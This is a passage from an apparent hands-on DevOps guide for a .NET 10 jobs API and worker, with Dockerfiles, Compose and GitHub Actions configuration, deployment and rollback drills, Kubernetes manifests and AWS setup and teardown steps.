Set the platform's grace period **longer** than `ShutdownTimeout` (for example Compose `stop_grace_period: 30s`). Messages that were not acked are redelivered by RabbitMQ after the channel closes.

---

<a id="add-docker"></a>

## ➕ Docker for .NET 10

### Words

- **Image:** a read-only package: filesystem layers plus settings (entrypoint, user, env, ports). Built once and run anywhere.
- **Container:** a running instance of an image, with its own process space, network and a thin writable layer. Delete it and the writable layer is gone. Data that must survive goes in a **volume**.
- **Layer and cache:** each `RUN`, `COPY` or `ADD` line makes a layer. If a line and everything before it did not change, Docker reuses the cached layer. So copy files that change rarely (`*.csproj`) **before** files that change often (`*.cs`).
- **Build context:** the folder you send to the builder (`.` in `docker build .`). Everything in it is sent, unless `.dockerignore` excludes it. A big context means slow builds and a risk of leaking secrets into the image.
- **.NET 10 base images:** `mcr.microsoft.com/dotnet/sdk:10.0` (build) and `mcr.microsoft.com/dotnet/aspnet:10.0` (run). From .NET 10 the default tags are Ubuntu 24.04 based. Debian images are no longer shipped. Alpine and chiseled variants also exist.

### `.dockerignore`

```
**/bin/
**/obj/
**/.vs/
**/.idea/
**/*.user
.git/
tests/
TestResults/
.env
**/secrets.json
**/appsettings.*.local.json
docker-compose*.yml
```

### A multi-stage Dockerfile for the API

```dockerfile
# src/Jobs.Api/Dockerfile   (build from the repo root: docker build -f src/Jobs.Api/Dockerfile .)

# ---- build stage: full SDK ----
FROM mcr.microsoft.com/dotnet/sdk:10.0 AS build
WORKDIR /src

# 1. Project files only, so "restore" is cached until a dependency changes.
#    Delete the props line if you do not have these files.
COPY Directory.Build.props Directory.Packages.props ./
COPY src/Jobs.Api/Jobs.Api.csproj   src/Jobs.Api/
COPY src/Jobs.Core/Jobs.Core.csproj src/Jobs.Core/
RUN dotnet restore src/Jobs.Api/Jobs.Api.csproj

# 2. Now the source code.
COPY src/ src/
RUN dotnet publish src/Jobs.Api/Jobs.Api.csproj -c Release -o /app/publish --no-restore /p:UseAppHost=false

# ---- runtime stage: ASP.NET Core runtime only ----
FROM mcr.microsoft.com/dotnet/aspnet:10.0 AS final

# Option A (simple, for learning): curl for the Docker HEALTHCHECK.
# Option B (production): delete these two lines and the HEALTHCHECK, and let the
# load balancer / Kubernetes probe /healthz/ready over HTTP instead.
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --from=build /app/publish .

# Non-root "app" user built into the official images
USER $APP_UID
# Already the default since .NET 8; written here to be explicit
ENV ASPNETCORE_HTTP_PORTS=8080
EXPOSE 8080

HEALTHCHECK --interval=10s --timeout=3s --start-period=20s --retries=3 \
  CMD curl -fsS http://localhost:8080/healthz/live || exit 1

# Exec form (JSON array), so the app is PID 1 and receives SIGTERM
ENTRYPOINT ["dotnet", "Jobs.Api.dll"]
```

Dockerfile comments must be on their own line. A `#` after an instruction becomes part of that instruction.

Notes:

- `USER $APP_UID` uses the variable defined in the official images. Do not run as root.
- The app listens on **8080**, not 80. Ports below 1024 need root. Map it with `-p 8080:8080` or set the load balancer's target port to 8080.
- Docker `HEALTHCHECK` is used by Docker and Compose only. Kubernetes ignores it and uses its own probes. ECS uses the health check in the task definition and the load balancer's target-group check.
- The worker Dockerfile is the same pattern. If the worker has no HTTP endpoints, use `mcr.microsoft.com/dotnet/runtime:10.0` as the final image.

```bash
docker build -f src/Jobs.Api/Dockerfile -t jobs-api:dev .
docker image ls jobs-api                  # note the size; compare with the sdk image
docker run --rm -p 8080:8080 -e ASPNETCORE_ENVIRONMENT=Development jobs-api:dev
docker image history jobs-api:dev         # see each layer and its size
```

### No Dockerfile: `dotnet publish /t:PublishContainer`

```bash
dotnet publish src/Jobs.Api -c Release --os linux --arch x64 /t:PublishContainer \
  -p:ContainerRepository=jobs-api -p:ContainerImageTag=dev
```

The SDK builds the image directly (non-root, port 8080 by default). Settings go in the `.csproj`: `ContainerBaseImage`, `ContainerFamily` (for example `noble-chiseled`), `ContainerImageTags`. A worker (console) project may need `<EnableSdkContainerSupport>true</EnableSdkContainerSupport>` (verify). Good for simple apps. A Dockerfile gives you more control and is what most interviewers expect you to read.

### `docker-compose.yml` for the whole platform

Put passwords in a `.env` file next to the compose file. Compose reads it automatically. Keep `.env` out of Git.

```bash
# .env   (never commit this file)
POSTGRES_PASSWORD=dev-pg-password
RABBITMQ_PASSWORD=dev-mq-password
```

```yaml
name: jobs

x-app-env: &app-env
  ConnectionStrings__Jobs: "Host=postgres;Port=5432;Database=jobs;Username=jobs;Password=${POSTGRES_PASSWORD}"
  ConnectionStrings__RabbitMq: "amqp://jobs:${RABBITMQ_PASSWORD}@rabbitmq:5672/"
  OTEL_EXPORTER_OTLP_ENDPOINT: "http://aspire-dashboard:18889"

services:
  postgres:
    image: postgres:17            # postgres:18 images use a different data path; read its docs before switching (verify)
    environment:
      POSTGRES_DB: jobs
      POSTGRES_USER: jobs
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?set POSTGRES_PASSWORD in .env}
    volumes:
      - pgdata:/var/lib/postgresql/data
    ports:
      - "127.0.0.1:5432:5432"     # only reachable from this machine
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U jobs -d jobs"]
      interval: 5s
      timeout: 3s
      retries: 10
    networks: [backend]

  rabbitmq:
    image: rabbitmq:4-management
    environment:
      RABBITMQ_DEFAULT_USER: jobs
      RABBITMQ_DEFAULT_PASS: ${RABBITMQ_PASSWORD:?set RABBITMQ_PASSWORD in .env}
    volumes:
      - mqdata:/var/lib/rabbitmq
    ports:
      - "127.0.0.1:15672:15672"   # management UI
    healthcheck:
      test: ["CMD", "rabbitmq-diagnostics", "-q", "ping"]
      interval: 10s
      timeout: 5s
      retries: 10
      start_period: 20s
    networks: [backend]

  redis:                          # optional: docker compose --profile redis up
    image: redis:7-alpine
    profiles: ["redis"]
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 10
    networks: [backend]

  migrator:                       # runs EF Core migrations once, then exits
    build: { context: ., dockerfile: src/Jobs.Migrator/Dockerfile }
    environment: *app-env
    depends_on:
      postgres: { condition: service_healthy }
    networks: [backend]

  api:
    build: { context: ., dockerfile: src/Jobs.Api/Dockerfile }
    environment:
      <<: *app-env
      ASPNETCORE_ENVIRONMENT: Development
      OTEL_SERVICE_NAME: jobs-api
    ports:
      - "8080:8080"
    depends_on:
      migrator: { condition: service_completed_successfully }
      rabbitmq: { condition: service_healthy }
    stop_grace_period: 30s
    restart: unless-stopped
    networks: [backend]

  worker:
    build: { context: ., dockerfile: src/Jobs.Worker/Dockerfile }
    environment:
      <<: *app-env
      DOTNET_ENVIRONMENT: Development
      OTEL_SERVICE_NAME: jobs-worker
    depends_on:
      migrator: { condition: service_completed_successfully }
      rabbitmq: { condition: service_healthy }
    stop_grace_period: 30s
    restart: unless-stopped
    networks: [backend]

  aspire-dashboard:               # local traces, metrics and logs (see add-otel)
    image: mcr.microsoft.com/dotnet/aspire-dashboard:latest   # pin a version tag (verify)
    environment:
      ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS: "true"     # local only (verify the variable name)
    ports:
      - "18888:18888"
    networks: [backend]

volumes:
  pgdata:
  mqdata:

networks:
  backend:
```

```bash
docker compose up -d --build
docker compose ps                          # state and health of each service
docker compose up -d --scale worker=4      # four workers for the load test
docker compose down                        # stop; volumes are kept
docker compose down -v                     # stop and DELETE volumes (all data)
docker compose config                      # the final file after variables are filled in
```

Why the `migrator` service: if the API ran migrations at startup, four API or worker copies would race to migrate at the same moment. One job that runs first, and `service_completed_successfully`, avoids that. The same idea becomes a pipeline step or a one-off ECS task in the cloud (see `add-cd`).

### Debugging commands

```bash
docker compose logs -f --tail 100 api              # follow one service's logs
docker compose exec postgres psql -U jobs -d jobs  # SQL shell inside the container
docker compose exec api sh                         # shell inside the API container
docker inspect --format '{{json .State.Health}}' jobs-api-1   # health check results
docker inspect --format '{{.State.ExitCode}} {{.State.OOMKilled}}' jobs-worker-1
docker stats --no-stream                           # CPU, memory, network per container
docker events --since 10m                          # starts, stops, kills, health changes
docker system df                                   # disk used by images, volumes, cache
```

Exit codes to know: **137** = killed by SIGKILL (often out of memory; check `OOMKilled`), **143** = stopped by SIGTERM, **139** = crashed (segmentation fault), **0** = clean exit.

### The "localhost inside a container" trap

- Inside a container, `localhost` means **that container**, not your laptop and not another container.
- The API must connect to `Host=postgres`, the **service name**. Compose runs a DNS server on the network that resolves service names.
- From your laptop, use `localhost:5432` because the port is published. From a container, use `postgres:5432`. These are two different connection strings. Keep them in different config (user-secrets locally, environment variables in Compose).
- To reach a program on your laptop from a container, use `host.docker.internal`. On Linux add `extra_hosts: ["host.docker.internal:host-gateway"]`.
- An app that listens on `127.0.0.1` inside a container cannot be reached from outside it. It must listen on all interfaces. The .NET images do this through `ASPNETCORE_HTTP_PORTS=8080`. Do not override it with `http://localhost:8080`.

---

<a id="add-ci"></a>

## ➕ CI with GitHub Actions

### Before the workflow

```xml
<!-- Directory.Build.props: lock files make restore repeatable and cacheable -->
<Project>
  <PropertyGroup>
    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
    <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
    <Nullable>enable</Nullable>
  </PropertyGroup>
</Project>
```

```bash
dotnet new globaljson --sdk-version 10.0.100 --roll-forward latestFeature   # pin the SDK (use your installed version)
dotnet restore                                                            # creates packages.lock.json files; commit them
```

### The workflow

```yaml
# .github/workflows/ci.yml
name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read            # least privilege by default

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true  # a new push cancels the old run on the same branch

env:
  DOTNET_NOLOGO: true
  DOTNET_CLI_TELEMETRY_OPTOUT: true

jobs:
  build-test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-dotnet@v5
        with:
          global-json-file: global.json
          cache: true                                   # caches ~/.nuget/packages
          cache-dependency-path: '**/packages.lock.json'

      - name: Restore
        run: dotnet restore --locked-mode

      - name: Build
        run: dotnet build --no-restore -c Release

      - name: Format check
        run: dotnet format --verify-no-changes --no-restore

      - name: Unit tests
        run: dotnet test tests/Jobs.UnitTests --no-build -c Release --logger trx --results-directory TestResults

      - name: Integration tests (Testcontainers uses the runner's Docker)
        run: dotnet test tests/Jobs.IntegrationTests --no-build -c Release --logger trx --results-directory TestResults

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: TestResults

  publish-image:
    needs: build-test
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                                  # needed to push to GHCR
    steps:
      - uses: actions/checkout@v5
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}         # built-in token; no personal token needed
      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository_owner }}/jobs-api   # the action lowercases the name
          tags: |
            type=sha,format=long
            type=raw,value=main
      - uses: docker/build-push-action@v6
        with:
          context: .
          file: src/Jobs.Api/Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

Action versions change. Check each action's page for the current major version before you copy this (verify). Copy the same `publish-image` job for the worker image.

**Service containers instead of Testcontainers.** If your integration tests read a fixed connection string, GitHub can start the databases for the job:

```yaml
    services:
      postgres:
        image: postgres:17
        env: { POSTGRES_USER: jobs, POSTGRES_PASSWORD: ci-only, POSTGRES_DB: jobs }
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U jobs" --health-interval 5s --health-timeout 3s --health-retries 10
      rabbitmq:
        image: rabbitmq:4-management
        ports: ["5672:5672"]
        options: >-
          --health-cmd "rabbitmq-diagnostics -q ping" --health-interval 10s --health-timeout 5s --health-retries 10
```

Testcontainers is usually better: the same tests run the same way on your laptop and in CI.

### What each stage protects against

| Stage | Stops this reaching `main` |
|---|---|
| Restore (`--locked-mode`) | a dependency changed without anyone noticing; "works on my machine" packages |
| Build (warnings as errors) | code that does not compile on a clean machine; nullable warnings ignored |
| Format check | style noise in reviews; inconsistent code |
| Unit tests | logic regressions (backoff, state machine, validation) |
| Integration tests | wrong SQL, missing migration, broken DI, broken auth setup, tenant leaks |
| Image publish only from `main` after green tests | an untested image reaching any environment |

### Secrets handling

- Store secrets in **Settings → Secrets and variables → Actions**. Use them as `${{ secrets.NAME }}`. GitHub hides them in logs.
- Prefer `GITHUB_TOKEN` with a small `permissions:` block over personal access tokens.
- To deploy to AWS, use **OIDC** (`aws-actions/configure-aws-credentials` with `role-to-assume`). No long-lived AWS keys are stored in GitHub. The IAM role trusts only your repo and branch.
- Pull requests from forks do not get your secrets. Do not "fix" this with `pull_request_target` plus a checkout of the fork's code. That runs untrusted code with your secrets.
- Use **Environments** (for example `production`) with required reviewers for deploy jobs.

### Branch protection rules (or rulesets)

On `main`: require a pull request; require the `build-test` check to pass; require the branch to be up to date; block force pushes and deletion; optionally require one approving review and linear history. Even on a solo project this proves the pipeline cannot be bypassed.

---

<a id="add-cd"></a>

## ➕ CD: deployment and release safety

### Environments and configuration

| Environment | Purpose | Data |
|---|---|---|
| Local (Compose) | develop, debug | fake |
| Staging (test) | real deploy path, smoke tests, drills | fake, production-like volume |
| Production | users | real |

- One image, many environments. Never build a different image per environment. Only **configuration** changes.
- .NET reads config in this order (later wins): `appsettings.json` → `appsettings.{Environment}.json` → user-secrets (Development only) → environment variables → command line.
- Set the environment with `ASPNETCORE_ENVIRONMENT` (API) or `DOTNET_ENVIRONMENT` (worker). `ConnectionStrings__Jobs` in an environment variable becomes `ConnectionStrings:Jobs`.
- Secrets come from Secrets Manager or Parameter Store, never from the image.

### Health and readiness gates

```csharp
builder.Services.AddHealthChecks()
    .AddDbContextCheck<JobsDb>(tags: ["ready"])                // Microsoft.Extensions.Diagnostics.HealthChecks.EntityFrameworkCore
    .AddCheck<RabbitMqConnectionCheck>("rabbitmq", tags: ["ready"]);

app.MapHealthChecks("/healthz/live",  new HealthCheckOptions { Predicate = _ => false }).AllowAnonymous();
app.MapHealthChecks("/healthz/ready", new HealthCheckOptions { Predicate = c => c.Tags.Contains("ready") }).AllowAnonymous();
```

The deploy tool sends traffic to a new instance only when `/healthz/ready` returns 200. Liveness checks no dependencies (see M5 Q13).

### Smoke tests after every deploy

```bash
#!/usr/bin/env bash
# smoke.sh BASE_URL TOKEN
set -euo pipefail
BASE="$1"; TOKEN="$2"

curl -fsS "$BASE/healthz/ready" > /dev/null
JOB_ID=$(curl -fsS -X POST "$BASE/jobs" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -H "Idempotency-Key: smoke-$(date +%s)" \
  -d '{"type":"echo","payload":{"msg":"smoke"}}' | jq -r .id)

for i in $(seq 1 30); do
  STATUS=$(curl -fsS "$BASE/jobs/$JOB_ID" -H "Authorization: Bearer $TOKEN" | jq -r .status)
  [ "$STATUS" = "Completed" ] && echo "smoke OK: $JOB_ID" && exit 0
  sleep 2
done
echo "smoke FAILED: job $JOB_ID status $STATUS"; exit 1
```

This checks the whole path: API → database → queue → worker → database. A failed smoke test triggers a rollback.

### Rolling vs blue-green vs canary

| Strategy | How | Good | Cost / risk |
|---|---|---|---|
| **Rolling** | replace instances a few at a time | default on ECS and Kubernetes; no extra capacity | old and new run together for a while; rollback is another rolling deploy |
| **Blue-green** | start a full new set (green), switch all traffic at once | instant switch back to blue | double capacity during the switch; the database is still shared |
| **Canary** | send a small share (for example 5%) to the new version, watch metrics, then increase | limits the blast radius | needs good metrics and traffic splitting |

All three need **old and new versions to work at the same time** with the same database and the same messages. That is why expand/contract and tolerant readers matter.

### Feature flags

Deploy code switched off, then turn it on without a deploy.

```csharp
// dotnet add package Microsoft.FeatureManagement.AspNetCore
builder.Services.AddFeatureManagement();     // reads the "FeatureManagement" config section

// appsettings.json: { "FeatureManagement": { "FairScheduler": false } }
if (await features.IsEnabledAsync("FairScheduler")) { /* new path */ } else { /* old path */ }
```

Separate **deploy** (code is on the servers) from **release** (users get the behaviour). Remove old flags once the feature is stable, or they become debt.

### Database migrations in deploys: expand/contract

Never make a change that breaks the version still running. Example: rename `payload` to `payload_json`.

| Step | Database | Code |
|---|---|---|
| 1. Expand | add `payload_json` (nullable) | v2 writes **both** columns, reads `payload` |
| 2. Backfill | copy old rows in small batches | — |
| 3. Switch | — | v3 reads `payload_json`, still writes both |
| 4. Contract | drop `payload` (a later release) | v4 writes only `payload_json` |

At every step, the previous code version still works. So you can roll back the **code** at any step without touching the database.

PostgreSQL rules for safe migrations:

- Run migrations as **one separate step** before the new code starts (pipeline step or a one-off ECS task), not in `Program.cs` of every instance.
- Generate SQL and review it: `dotnet ef migrations script --idempotent -o migrate.sql`. Or build a bundle: `dotnet ef migrations bundle -o efbundle`.
- Set `SET lock_timeout = '5s';` so a migration waiting for a lock fails fast instead of blocking all traffic behind it.
- Create indexes with `CREATE INDEX CONCURRENTLY`. It cannot run inside a transaction, so in EF use `migrationBuilder.Sql("CREATE INDEX CONCURRENTLY ...", suppressTransaction: true);`.
- Adding a `NOT NULL` constraint to a big table: add `CHECK (col IS NOT NULL) NOT VALID`, then `VALIDATE CONSTRAINT` in a later step.
- `ADD COLUMN ... DEFAULT <constant>` is fast in PostgreSQL 11+. Rewriting a column type is not.
- Down migrations are rarely safe after real data was written. Plan to roll **forward** with a fix, and keep a restore point.

### The rollback plan (write it before you deploy)

1. **Trigger:** smoke test fails, or the 5xx rate or p99 crosses the alert line within 15 minutes of the deploy.
2. **Action:** redeploy the previous image tag. Images are tagged by Git SHA, so "previous" is exact.
3. **Database:** the expand-only migration stays. The old code ignores the new column.
4. **Messages:** messages already published in the new format must be readable by the old consumer (tolerant reader). If not, pause the producer first.
5. **Check:** smoke test passes; error rate back to normal.

On ECS, the deployment circuit breaker can roll back automatically:

```bash
aws ecs update-service --cluster jobs --service jobs-api \
  --deployment-configuration "deploymentCircuitBreaker={enable=true,rollback=true},maximumPercent=200,minimumHealthyPercent=100"
```

### Drill 1: deploy a bad version and recover

Do this in staging and write down the times.

1. Deploy a good version. Run the smoke test. Note the image tag.
2. Make a bad version: for example `/healthz/ready` returns 503, or `POST /jobs` throws for one job type. Deploy it.
3. Watch: does the deploy stop by itself (readiness / circuit breaker)? Does an alert fire? How long until you notice?
4. Roll back with the runbook (`add-runbook`). Time it.
5. Write a short report: time to detect, time to recover, what was confusing, what you will change.

### Drill 2: restore a real backup

A backup you never restored is a hope, not a backup.

```bash
# Local or EC2: logical backup and restore into a clean database
pg_dump -h localhost -U jobs -d jobs -Fc -f jobs_$(date +%F).dump
createdb -h localhost -U jobs jobs_restore
pg_restore -h localhost -U jobs -d jobs_restore --no-owner jobs_$(date +%F).dump

# RDS: point-in-time restore creates a NEW instance
aws rds restore-db-instance-to-point-in-time \
  --source-db-instance-identifier jobs-db \
  --target-db-instance-identifier jobs-db-restore-test \
  --restore-time 2026-10-19T09:00:00Z \
  --db-instance-class db.t4g.micro --no-multi-az
```

Then **verify**, do not just look:

```sql
-- run on both source (at the same point in time) and the restore
SELECT status, count(*) FROM jobs WHERE created_at < '2026-10-19 09:00:00+00' GROUP BY status ORDER BY status;
SELECT max(created_at) FROM jobs;
```

Record: how long the restore took (your real RTO), how much data was lost (your real RPO), and whether jobs that were "Running" at the restore point need to be re-queued (reconciliation). Delete the restored instance afterwards. It costs money.

---

<a id="add-k8s"></a>

## ➕ Kubernetes basics (OPTIONAL extension)

Do this only after Docker, CI/CD and one working AWS deployment. Kubernetes questions come up in interviews, so know the words even if you never run a cluster.

### The objects

| Object | What it is |
|---|---|
| **Pod** | one or more containers that share network and storage; the smallest unit; pods are replaced, not repaired |
| **Deployment** | keeps N copies of a pod running; does rolling updates and rollbacks |
| **Service** | a stable name and IP in front of changing pods (`jobs-api.jobs.svc.cluster.local`) |
| **Ingress** | HTTP routing from outside into Services (host and path rules, TLS) |
| **ConfigMap** | non-secret config, as env vars or files |
| **Secret** | secret config; only base64-encoded by default, so enable encryption at rest and limit access |
| **Namespace** | a folder for objects (`jobs-staging`, `jobs-prod`); quotas and permissions per namespace |
| **HPA** | Horizontal Pod Autoscaler: changes the replica count from CPU, memory or custom metrics |

### Probes

- **startupProbe:** "has it finished starting?" Other probes wait until it passes. Use it for slow starts.
- **livenessProbe:** "is it stuck?" Failure → the container is **restarted**. Check no dependencies.
- **readinessProbe:** "can it take traffic now?" Failure → removed from the Service, **not** restarted. Check the database and broker.

### Requests and limits

- **requests:** what the scheduler reserves. Used to place pods and by the HPA for percentages.
- **limits:** the maximum. Over the memory limit → the container is OOM-killed (exit 137). Over the CPU limit → throttled (slower, not killed).
- .NET reads the container limits. By default the GC heap limit is 75% of the memory limit.

### Minimal `deployment.yaml` and `service.yaml` for the API

```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jobs-api
  namespace: jobs
spec:
  replicas: 2
  selector:
    matchLabels: { app: jobs-api }
  strategy:
    type: RollingUpdate
    rollingUpdate: { maxUnavailable: 0, maxSurge: 1 }
  template:
    metadata:
      labels: { app: jobs-api }
    spec:
      terminationGracePeriodSeconds: 40
      securityContext:
        runAsNonRoot: true
      containers:
        - name: api
          image: ghcr.io/your-user/jobs-api:sha-0123456789abcdef   # an exact tag, never "latest"
          ports:
            - containerPort: 8080
          env:
            - name: ASPNETCORE_ENVIRONMENT
              value: Production
            - name: ConnectionStrings__Jobs
              valueFrom:
                secretKeyRef: { name: jobs-secrets, key: postgres }
          envFrom:
            - configMapRef: { name: jobs-config }
          resources:
            requests: { cpu: 250m, memory: 256Mi }
            limits:   { memory: 512Mi }
          startupProbe:
            httpGet: { path: /healthz/live, port: 8080 }
            periodSeconds: 5
            failureThreshold: 24          # up to 2 minutes to start
          livenessProbe:
            httpGet: { path: /healthz/live, port: 8080 }
            periodSeconds: 10
            failureThreshold: 3
          readinessProbe:
            httpGet: { path: /healthz/ready, port: 8080 }
            periodSeconds: 5
            failureThreshold: 2
          securityContext:
            allowPrivilegeEscalation: false
```

```yaml
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: jobs-api
  namespace: jobs
spec:
  selector: { app: jobs-api }
  ports:
    - port: 80
      targetPort: 8080
```

```bash
kubectl apply -f deployment.yaml -f service.yaml
kubectl -n jobs get pods -o wide
kubectl -n jobs describe pod <pod>          # events: probe failures, OOMKilled, image pull errors
kubectl -n jobs logs -f deploy/jobs-api
kubectl -n jobs rollout status deploy/jobs-api
kubectl -n jobs rollout undo deploy/jobs-api   # roll back
kubectl -n jobs port-forward svc/jobs-api 8080:80
```

### HPA and KEDA

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata: { name: jobs-api, namespace: jobs }
spec:
  scaleTargetRef: { apiVersion: apps/v1, kind: Deployment, name: jobs-api }
  minReplicas: 2
  maxReplicas: 6
  metrics:
    - type: Resource
      resource: { name: cpu, target: { type: Utilization, averageUtilization: 70 } }
```

CPU is a poor signal for **workers**. A worker waiting on the database uses little CPU while the queue grows. **KEDA** (Kubernetes Event-Driven Autoscaling) scales a Deployment from the queue length:

```yaml
apiVersion: keda.sh/v1alpha1
kind: ScaledObject
metadata: { name: jobs-worker, namespace: jobs }
spec:
  scaleTargetRef: { name: jobs-worker }
  minReplicaCount: 1
  maxReplicaCount: 8
  triggers:
    - type: rabbitmq
      metadata:
        queueName: jobs
        mode: QueueLength
        value: "100"              # about one worker per 100 waiting messages
        hostFromEnv: RABBITMQ_URL
```

KEDA can also scale to zero. Check the trigger fields in the KEDA docs for your version (verify). Remember: more workers only help if the database can take the extra load.

### When not to use Kubernetes

- One small team, a few services, no platform engineers: ECS Fargate or a PaaS is simpler and cheaper to run.
- You would spend more time on the cluster (upgrades, networking, ingress, certificates, RBAC) than on the product.
- For this project: Compose locally and ECS in AWS are enough. Kubernetes is a learning extension, not a requirement.

---

<a id="add-aws"></a>

## ➕ AWS basics mapped to the project

### Service map

| Need | AWS choice | Notes |
|---|---|---|
| Run the API and worker | **ECS on Fargate** | containers without managing servers; pay per vCPU and memory per second; the best fit here |
| | EC2 | you manage the OS; cheapest for one small always-on box running Compose |
| | Lambda | 15-minute limit; fine for short SQS-triggered jobs; not for a long-running RabbitMQ consumer |
| Database | **RDS for PostgreSQL** | automated backups, point-in-time restore, Multi-AZ failover |
| Queue | **Amazon MQ for RabbitMQ** | same code as local; an always-on broker billed per hour |
| | SQS | serverless, cheap at low volume, you already know it; different model (visibility timeout, no exchanges); hide the broker behind an interface |
| Cache (optional) | ElastiCache (Redis or Valkey) | rate limits, idempotency cache |
| Files | S3 | input files, results; block public access; presigned URLs |
| Secrets | Secrets Manager / SSM Parameter Store | injected into ECS tasks |
| Logs, metrics, alarms | CloudWatch | `awslogs` driver for container logs; alarms; dashboards |
| Traces | AWS Distro for OpenTelemetry (ADOT) collector → X-Ray / CloudWatch | your app keeps exporting OTLP |
| Images | ECR (or GHCR) | ECR is simplest with ECS and IAM |

### IAM: least privilege, roles not keys

- No access keys in code, images or config. ECS tasks get a **task role**. GitHub Actions uses an **OIDC role**.
- ECS has two roles. The **execution role** pulls the image and reads the secrets for injection. The **task role** is what your code uses (S3, SES, SQS).
- Give each role only the actions and resources it needs:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::jobs-files-staging/results/*"
    }
  ]
}
```

- Root user: MFA on, no access keys, not used day to day. Use an admin user or IAM Identity Center for yourself.

### VPC basics

```
VPC 10.0.0.0/16
├── public subnets (2 AZs):  ALB  (internet-facing, port 443)
└── private subnets (2 AZs): ECS tasks (API, worker), RDS, Amazon MQ, ElastiCache
```

- **Security groups** are stateful firewalls on each resource. Reference other groups, not IP ranges:
  - `alb-sg`: allow 443 from `0.0.0.0/0`.
  - `api-sg`: allow 8080 from `alb-sg` only.
  - `db-sg`: allow 5432 from `api-sg` and `worker-sg` only.
  - `mq-sg`: allow 5671 from `api-sg` and `worker-sg` only.
- Private subnets need a way out to pull images and call AWS APIs: a **NAT gateway** (charged per hour and per GB, a common surprise bill) or **VPC endpoints** (ECR, S3, Secrets Manager, CloudWatch Logs). For a short learning deployment, some people run tasks in public subnets with a public IP and a security group that allows no inbound traffic except from the ALB. That is cheaper but less safe. Know the trade-off and say it out loud in interviews.

### Cost control

- **Free Tier changed on 15 July 2025.** Accounts created on or after that date choose a Free plan or a Paid plan. New accounts get USD 100 in credits, plus up to USD 100 more for completing set activities. The Free plan ends when the credits run out or after six months. Some services are not available on the Free plan. Older accounts keep the old 12-month Free Tier. Check the current AWS Free Tier page before relying on any of this (verify).
- Create a **budget** on day one, with email alerts at 50%, 80% and 100%:

```bash
aws budgets create-budget --account-id 123456789012 \
  --budget '{"BudgetName":"jobs-monthly","BudgetLimit":{"Amount":"20","Unit":"USD"},"TimeUnit":"MONTHLY","BudgetType":"COST"}' \
  --notifications-with-subscribers '[{"Notification":{"NotificationType":"ACTUAL","ComparisonOperator":"GREATER_THAN","Threshold":80,"ThresholdType":"PERCENTAGE"},"Subscribers":[{"SubscriptionType":"EMAIL","Address":"you@example.com"}]}]'
```

- Optional **billing alarm**: turn on "Receive billing alerts", then a CloudWatch alarm on `EstimatedCharges` (in `us-east-1`).
- Things that cost money while idle: NAT gateways, load balancers, RDS instances and their storage, Amazon MQ brokers, ElastiCache nodes, public IPv4 addresses, Secrets Manager secrets, CloudWatch logs with no retention. Check prices on the AWS pricing pages; do not guess.
- Tag everything: `project=jobs`, `env=staging`, `owner=rahul`.

### A minimal "deploy the project" path

1. **Registry:** create ECR repos `jobs-api` and `jobs-worker`. Push images from CI (OIDC role) or by hand:
   ```bash
   aws ecr get-login-password --region eu-west-1 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.eu-west-1.amazonaws.com
   docker tag jobs-api:dev 123456789012.dkr.ecr.eu-west-1.amazonaws.com/jobs-api:sha-abc123
   docker push 123456789012.dkr.ecr.eu-west-1.amazonaws.com/jobs-api:sha-abc123
   ```
2. **Network:** a VPC with 2 public and 2 private subnets, and the security groups above.
3. **Data:** RDS PostgreSQL (smallest instance class, single-AZ for learning, `--manage-master-user-password`, backups on). Amazon MQ for RabbitMQ (single-instance broker) or SQS.
4. **Secrets:** connection strings in Secrets Manager.
5. **Migrate:** run the migrator image once as a one-off ECS task (`aws ecs run-task ...`) and check that it exits with code 0.
6. **Run:** an ECS cluster, a task definition per image (port 8080, `awslogs` log driver, secrets, task role), a service for the API behind an ALB (target group health check `/healthz/ready`, port 8080), and a service for the worker (no load balancer).
7. **Verify:** run `smoke.sh` against the ALB URL. Check the CloudWatch logs and the dashboard.
8. **Record:** what you deployed, the cost after 24 hours, and the teardown time.

Infrastructure as code (Terraform or AWS CDK in C#) makes steps 2–6 repeatable, and lets teardown be one command. It is a strong addition once the manual path works.

### Teardown checklist

- [ ] ECS services scaled to 0 and deleted; cluster deleted
- [ ] ALB and target groups deleted
- [ ] NAT gateway deleted; Elastic IPs released
- [ ] RDS instance deleted (decide on a final snapshot); manual snapshots deleted if not needed
- [ ] Amazon MQ broker deleted; ElastiCache cluster deleted
- [ ] ECR images removed (or a lifecycle policy keeps only the last few)
- [ ] S3 buckets emptied and deleted
- [ ] Secrets Manager secrets scheduled for deletion
- [ ] CloudWatch log groups deleted or given a retention period
- [ ] VPC deleted (after everything inside it)
- [ ] Nothing left with the tag: `aws resourcegroupstaggingapi get-resources --tag-filters Key=project,Values=jobs`
